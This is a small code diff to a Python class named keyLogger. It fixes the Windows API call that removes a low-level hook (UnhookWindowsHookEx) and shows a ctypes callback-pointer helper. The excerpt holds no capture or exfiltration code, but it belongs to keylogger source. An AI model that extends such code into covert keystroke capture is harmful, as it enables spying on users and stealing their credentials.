@@ -30,9 +30,9 @@ class keyLogger:
     def uninstallHookProc(self):
         if self.hooked is None:
             return
-        self.lUser32.UnHookWindowsEx(self.hooked)
+        self.lUser32.UnhookWindowsHookEx(self.hooked)
         self.hooked = None
-
+        
 def getFPTR(fn):
     CMPFUNC = CFUNCTYPE(c_int, c_int, c_int, POINTER(c_void_p))
     return CMPFUNC(fn)
